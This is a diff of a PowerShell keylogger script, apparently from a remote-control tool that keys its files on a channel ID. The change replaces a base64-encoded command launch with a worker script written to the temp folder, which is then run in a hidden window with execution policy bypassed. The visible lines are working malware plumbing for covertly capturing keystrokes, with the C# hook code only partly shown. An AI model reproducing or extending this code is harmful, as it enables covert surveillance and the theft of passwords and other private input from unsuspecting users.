@@ -3,9 +3,10 @@ param($args)
 $channelID = $env:ChannelID
 $logFile = "$env:TEMP\keylog_$channelID.txt"
 $pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
+$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"
 
-# PowerShell script to run in background – note the careful escaping
-$scriptBlock = @"
+# Create the worker script content (contains the actual keylogger)
+$workerContent = @"
 `$cSharpCode = @"
 using System;
 using System.Diagnostics;
@@ -94,14 +95,13 @@ while(`$true) {
 }
 "@
 
-# Encode the script as a command to pass to new PowerShell process
-$bytes = [Text.Encoding]::Unicode.GetBytes($scriptBlock)
-$encodedCommand = [Convert]::ToBase64String($bytes)
+# Write worker script to temp file
+$workerContent | Out-File -FilePath $workerScript -Encoding UTF8
 
-# Start hidden PowerShell process
+# Launch worker in hidden PowerShell window
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
-$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
+$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$workerScript`""
 $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
 $p = [System.Diagnostics.Process]::Start($psi)
